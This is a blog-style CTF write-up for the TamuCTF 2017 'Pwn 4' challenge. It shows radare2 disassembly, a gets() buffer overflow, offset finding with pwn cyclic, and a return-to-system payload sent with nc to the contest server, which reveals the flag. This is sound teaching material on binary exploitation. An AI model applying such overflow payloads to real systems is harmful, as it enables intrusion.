<!DOCTYPE html>
<html>
<head>
    <meta name="generator" content="Hugo 0.29-DEV" />

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="My thoughts and rambles">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <link rel="icon" type="image/png" href="/images/favicon.ico">

    
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">

    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">

    
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
    <link rel="stylesheet" href="/css/ionicons.min.css"/>
    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="/css/hmdl-style.css"/>
	<link rel="stylesheet" href="/css/pygment.css">


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-103806632-1', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>


    <title>TamuCTF 2017 - Pwn 4</title>
</head>

<body style="background-image: url('/images/background.jpg');">
    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
            <div class="mdl-layout__header-row">
                <div class="mdl-layout-spacer"></div>
                <nav class="mdl-navigation">
                <a class="mdl-navigation__link" href="/">Home</a>
                <a class="mdl-navigation__link" href="/post/">Articles</a>
                <a class="mdl-navigation__link" href="/project/">Projects</a>
                <a class="mdl-navigation__link" href="/about/">About</a>
                </nav>
            </div>
        </header>
        <div class="mdl-layout__drawer">
            <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="/">Home</a>
            <a class="mdl-navigation__link" href="/post/">Articles</a>
            <a class="mdl-navigation__link" href="/project/">Projects</a>
            <a class="mdl-navigation__link" href="/about/">About</a>
            </nav>
        </div>

        <main class="mdl-layout__content">

		

            <div class="hmdl-page mdl-grid">
                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
                    <div class="mdl-card__media mdl-color-text--grey-50" style=" background-color:white;">
                        <h3 style="color:orange;">TamuCTF 2017 - Pwn 4</h3>
                    </div>
                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
                        <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>

                        <div>
							<strong>
                            		<strong>Tzaoh</strong>
							</strong>
                            <span>Aug 11, 2017</span>
                        </div>
                        <div class="section-spacer"></div>
                    </div>
                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                        

<p><img src="/assets/TamuCTF2017/pwn4/1-pwn4_description.png" alt="Pwn4 challenge description" /></p>

<p>Is curious that this specific challenge had more value than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>).<br />
As we will see below, it was way easier. Lets take a look with r2.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn4/pwn4
</span><span class="">$ r2 -A -c </span><span class="s">&#39;afl&#39;</span><span class=""> pwn4</span></code></pre>
</div>
<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
</span><span class="">[x] Analyze len bytes of instructions for references (aar)
</span><span class="">[x] Analyze function calls (aac)
</span><span class="">[x] Use -AA or aaaa to perform additional experimental analysis.
</span><span class="">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
</span><span class="">0x08048330    3 35           sym._init
</span><span class="">0x08048353    1 25           fcn.08048353
</span><span class="">0x0804836c    1 4            sub.gets_12_36c
</span><span class="">0x08048370    1 6            sym.imp.gets
</span><span class="">0x08048376    2 10   -&gt; 22   fcn.08048376
</span><span class="">0x08048380    1 6            sym.imp.puts
</span><span class="">0x08048386    2 10   -&gt; 22   fcn.08048386
</span><span class="">0x08048390    1 6            sym.imp.system
</span><span class="">0x08048396    2 10   -&gt; 22   fcn.08048396
</span><span class="">0x080483a0    1 6            sym.imp.__libc_start_main
</span><span class="">0x080483a6    2 10   -&gt; 22   fcn.080483a6
</span><span class="">0x080483b0    1 6            sym.imp.setvbuf
</span><span class="">0x080483b6    2 10   -&gt; 22   fcn.080483b6
</span><span class="">0x080483c0    1 1            sub.__gmon_start___252_3c0
</span><span class="">0x080483c1    1 15           fcn.080483c1
</span><span class="">0x080483d0    1 33           entry0
</span><span class="">0x080483f1    1 1            fcn.080483f1
</span><span class="">0x08048400    1 4            sym.__x86.get_pc_thunk.bx
</span><span class="">0x08048410    4 43           sym.deregister_tm_clones
</span><span class="">0x0804843c    4 57           fcn.0804843c
</span><span class="">0x08048475    3 41           fcn.08048475
</span><span class="">0x080484a0    8 43   -&gt; 93   sym.frame_dummy
</span><span class="hl"><span class="">0x080484cb    1 25           sym.flag_func
</span></span><span class="hl"><span class="">0x080484e4    1 25           sym.func2
</span></span><span class="hl"><span class="">0x080484fd    1 24           sym.func1
</span></span><span class="hl"><span class="">0x08048515    1 71           sym.main
</span></span><span class="">0x08048560    4 93           sym.__libc_csu_init
</span><span class="">0x080485bd    1 5            fcn.080485bd
</span><span class="">0x080485c2    1 22           fcn.080485c2</span></code></pre>
</div>

<p>We can see four interesting functions:</p>

<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080483d0]&gt; s sym.flag_func; Vp
</span><span class="">[0x080484cb 16% 240 pwn4]&gt; pd $r @ sym.flag_func                         
</span><span class="">┌ (fcn) sym.flag_func 25
</span><span class="">│   sym.flag_func ();
</span><span class="">│           0x080484cb      55             push ebp
</span><span class="">│           0x080484cc      89e5           ebp = esp                       
</span><span class="">│           0x080484ce      83ec08         esp -= 8                     
</span><span class="">│           0x080484d1      83ec0c         esp -= 0xc                 
</span><span class="">│         ; &#34;/bin/cat flag2.txt&#34;        
</span><span class="hl"><span class="">│           0x080484d4      68e0850408     push str._bin_cat_flag2.txt
</span></span><span class="">│         ; int system(const char *string) ; sym.imp.system
</span><span class="hl"><span class="">│           0x080484d9      e8b2feffff     sym.imp.system ()
</span></span><span class="">│           0x080484de      83c410         esp += 0x10
</span><span class="">│           0x080484e1      90                                   
</span><span class="">│           0x080484e2      c9                                   
</span><span class="">└           0x080484e3      c3                                     
</span><span class="">┌ (fcn) sym.func2 25                                             
</span><span class="">│   sym.func2 ();                                                
</span><span class="">│           0x080484e4      55             push ebp              
</span><span class="">│           0x080484e5      89e5           ebp = esp             
</span><span class="">│           0x080484e7      83ec08         esp -= 8              
</span><span class="">│           0x080484ea      83ec0c         esp -= 0xc            
</span><span class="">│           0x080484ed      68f3850408     push str.Nothing_to_see_here
</span><span class="">│         ; int puts(const char *s)                      
</span><span class="">│           0x080484f2      e889feffff     sym.imp.puts ()
</span><span class="">│           0x080484f7      83c410         esp += 0x10
</span><span class="">│           0x080484fa      90                                               
</span><span class="">│           0x080484fb      c9                                   
</span><span class="">└           0x080484fc      c3                                   
</span><span class="">┌ (fcn) sym.func1 24
</span><span class="">│   sym.func1 ();
</span><span class="">│           ; var int local_ch @ ebp-0xc
</span><span class="">│              ; CALL XREF from 0x0804854a (sym.main)
</span><span class="">│           0x080484fd      55             push ebp
</span><span class="">│           0x080484fe      89e5           ebp = esp
</span><span class="">│           0x08048500      83ec18         esp -= 0x18
</span><span class="">│           0x08048503      83ec0c         esp -= 0xc
</span><span class="">│           0x08048506      8d45f4         eax = [local_ch]
</span><span class="">│           0x08048509      50             push eax
</span><span class="">│         ; char*gets(char *s)
</span><span class="hl"><span class="">│           0x0804850a      e861feffff     sym.imp.gets ()           
</span></span><span class="">│           0x0804850f      83c410         esp += 0x10
</span><span class="">│           0x08048512      90                        
</span><span class="">│           0x08048513      c9                        
</span><span class="">└           0x08048514      c3                          
</span><span class="">┌ (fcn) sym.main 71         
</span><span class="">│   sym.main ();
</span><span class="">│           ; var int local_4h_2 @ ebp-0x4
</span><span class="">│           ; var int local_4h @ esp+0x4
</span><span class="">│              ; DATA XREF from 0x080483e7 (entry0)
</span><span class="">│           0x08048515      8d4c2404       ecx = [local_4h]
</span><span class="">│           0x08048519      83e4f0         esp &amp;= 0xfffffff0
</span><span class="">│           0x0804851c      ff71fc         push dword [ecx - 4]
</span><span class="">│           0x0804851f      55             push ebp
</span><span class="">│           0x08048520      89e5           ebp = esp
</span><span class="">│           0x08048522      51             push ecx
</span><span class="">│           0x08048523      83ec04         esp -= 4
</span><span class="">│           0x08048526      a13ca00408     eax = dword obj.stdout
</span><span class="">│           0x0804852b      6a00           push 0
</span><span class="">│           0x0804852d      6a00           push 0
</span><span class="">│           0x0804852f      6a02           push 2
</span><span class="">│           0x08048531      50             push eax
</span><span class="">│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
</span><span class="">│           0x08048532      e879feffff     sym.imp.setvbuf ()
</span><span class="">│           0x08048537      83c410         esp += 0x10
</span><span class="">│           0x0804853a      83ec0c         esp -= 0xc
</span><span class="">│           0x0804853d      6807860408     push str.I_require_an_input:
</span><span class="">│         ; int puts(const char *s)
</span><span class="">│           0x08048542      e839feffff     sym.imp.puts ()
</span><span class="">│           0x08048547      83c410         esp += 0x10
</span><span class="hl"><span class="">│           0x0804854a      e8aeffffff     sym.func1 ()
</span></span><span class="">│           0x0804854f      b800000000     eax = 0
</span><span class="">│           0x08048554      8b4dfc         ecx = dword [local_4h_2]
</span><span class="">│           0x08048557      c9                                     
</span><span class="">│           0x08048558      8d61fc         esp = [ecx - 4]
</span><span class="">└           0x0804855b      c3                                               </span></code></pre>
</div>

<blockquote>
<p>By the way the command <code>s sym.flag_func; Vp</code> can be splitted and explained like this:<br />
<code>s sym.flag_func</code> - set the position of the cursor at the beginning of the function.<br />
<code>V</code> - change the visual mode.<br />
<code>p</code> - change mode view.</p>
</blockquote>

<p>Here they are, lets take a look at those functions.</p>

<p>Obviously we should try to execute <code>sym.flag_func()</code> function, it seems it will try print a file called <code>flag2.txt</code> (strange name right? why 2?) using the <code>cat</code> command on the remote server. But that function is never called. You can check it by yourself with:</p>
<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080484f7]&gt; axt sym.flag_func</span></code></pre>
</div>
<p>Then we need to dig a bit more.</p>

<ol>
<li><p><code>sym.func2()</code> is just printing a message (it even tells you not to waste your time with it). So we can ignore this one.</p></li>

<li><p><code>sym.func1()</code> is a bit more interesting because it is using the unsecure function <code>gets()</code>. If it is called somewhere, we would be able to overwrite the <code>$eip</code> register.</p></li>

<li><p>We dont need to cross our fingers a lot of time because we fastly see that <code>sym.func1()</code> is being called from <code>main()</code>! yay! ✌️ .</p></li>
</ol>

<p>Lets figure out, how many bytes do we need to overwrite <code>$eip</code> register.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic </span><span class="m">40</span><span class=""> </span><span class="p">;</span><span class=""> To generate string with unique subsequences.
</span><span class="">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
</span><span class="">$ r2 -R </span><span class="s">&#34;stdin=\&#34;`pwn cyclic 40`\&#34;&#34;</span><span class=""> -A -d -c </span><span class="s">&#39;dc&#39;</span><span class=""> pwn4</span></code></pre>
</div>
<p><div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">Process with PID 12102 started...
</span><span class="">= attach 12102 12102
</span><span class="">bin.baddr 0x08048000
</span><span class="">Using 0x8048000
</span><span class="">Assuming filepath /root/pwn4
</span><span class="">asm.bits 32
</span><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
</span><span class="">TODO: esil-vm not initialized
</span><span class="">[Cannot determine xref search boundariesr references (aar)
</span><span class="">[x] Analyze len bytes of instructions for references (aar)
</span><span class="">[x] Analyze function calls (aac)
</span><span class="">[x] Use -AA or aaaa to perform additional experimental analysis.
</span><span class="">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
</span><span class="">ptrace (PT_ATTACH): Operation not permitted
</span><span class="">= attach 12102 12102
</span><span class="">I require an input:
</span><span class="">child stopped with signal 11
</span><span class="hl"><span class="">[+] SIGNAL 11 errno=0 addr=0x61616165 code=1 ret=0
</span></span><span class="hl"><span class="">[0x61616165]&gt;</span></span></code></pre>
</div></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic -l 0x61616165
</span><span class=""></span><span class="m">16</span></code></pre>
</div>
<p>So, we can overwrite the <code>$eip</code> register writing the next 4 bytes (from byte 17 to 20)!<br />
Now we create a file with the previously commented file (<code>flag2.txt</code>) to try this out.</p>

<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ </span><span class="n">echo</span><span class=""> This is the flag &gt; flag2.txt
</span><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn4
</span><span class="">I require an input:
</span><span class="hl"><span class="">This is the flag
</span></span><span class="">Segmentation fault</span></code></pre>
</div>

<p>Good! what will the remote server say?</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
</span><span class="">I require an input:                                                                              Did you really think it would be that easy?</span></code></pre>
</div>
<p>Ouch! that file was just a decoy. There must be a another one named <code>flag.txt</code> waiting for us.
&gt; But how could we executed it? There is only one function which print a file and its name is hardcoded.</p>

<p>Well, that is not a problem, because there is a call to <code>system()</code>.
The only thing we need to do is to pass a different argument: <code>cat flag.txt</code> instead of <code>cat flag2.txt</code>.</p>

<p>If you inspect all the strings of the binary you may find surprise:</p>

<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x61616165]&gt; iz
</span><span class="">vaddr=0x080485e0 paddr=0x000005e0 ordinal=000 sz=19 len=18 section=.rodata type=ascii string=/bin/cat flag2.txt
</span><span class="">vaddr=0x080485f3 paddr=0x000005f3 ordinal=001 sz=20 len=19 section=.rodata type=ascii string=Nothing to see here
</span><span class="">vaddr=0x08048607 paddr=0x00000607 ordinal=002 sz=20 len=19 section=.rodata type=ascii string=I require an input:
</span><span class="hl"><span class="">vaddr=0x0804a028 paddr=0x00001028 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt</span></span></code></pre>
</div>

<p>As you may know, in order to pass the arguments to <code>system</code> they need to be pushed into the stack. In case of a string not its value but its reference (a pointer <code>0x0804a028</code> in this case).</p>

<p>Because we can overwrite the stack we can &ldquo;imitate&rdquo; a push into it:</p>

<ol>
<li><p>Instead of starting in the address of <code>sym.flag_func()</code> (<code>0x080484cb</code>) we will use <code>system()</code> one (<code>0x080484d9</code>).<br />
<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot;)'</code></p></li>

<li><p>We need to push the pointer to the string to indicate <code>system()</code> which is its argument.<br />
<code>$ python -c 'print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)'</code></p></li>
</ol>

<p>Lets send to the server:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xd9\x84\x04\x08&#34; + &#34;\x28\xa0\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
</span><span class="">I require an input:
</span><span class="">gigem</span><span class="o">{</span><span class="">R3TURN_0R13NT3D_PR0F1T</span><span class="o">}</span></code></pre>
</div>
<p>Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>

<h3 id="complete-video">Complete video</h3>

<p><a href="https://asciinema.org/a/drr8rhjxvoqpmu6ke8czn6hwf?autoplay=1" target="_blank"><img src="https://asciinema.org/a/drr8rhjxvoqpmu6ke8czn6hwf.png" /></a></p>

<h3 id="tools-used-and-some-references">Tools used and some references:</h3>

<ul>
<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a> and <a href="http://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic">cyclic</a> - To generate unique substrings.</li>
<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
</ul>

                    </div>
                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                        <strong>
                            	<strong>Tzaoh</strong>
						</strong>
                        <p></p>
                    </div>  
                </div>                
                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
                    <a href="/post/tamuctf2017/pwn3/">
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                        <i class="icon ion-android-arrow-back"></i>
                        </button>
                        Older
                    </a>
                    <div class="section-spacer"></div>
                    <a href="/post/garage_door/rfcommunication/">
                        Newer
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                            <i class="icon ion-android-arrow-forward"></i>
                        </button>
                    </a>
                </nav>
 
            </div>        
        </main>
        <footer class="mdl-mini-footer">
            <div class="mdl-mini-footer--left-section">                
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:Firstname@example.com?subject=Hi">
                    <i class="material-icons_lg icon ion-email"></i>
                    <span class="visuallyhidden">Email</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/BlackHoods">
                    <i class="material-icons_lg icon ion-social-github"></i>
                    <span class="visuallyhidden">Github</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/firstname_lastname">
                    <i class="material-icons_lg icon ion-social-twitter "></i>
                    <span class="visuallyhidden">Twitter</span>
                </a>


            </div>
            <div class="mdl-mini-footer--right-section">
                <span>© 2017 </span>
            </div>
        </footer>
        <div class="mdl-layout__obfuscator"></div>
    </div>
    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>


</body>
</html>

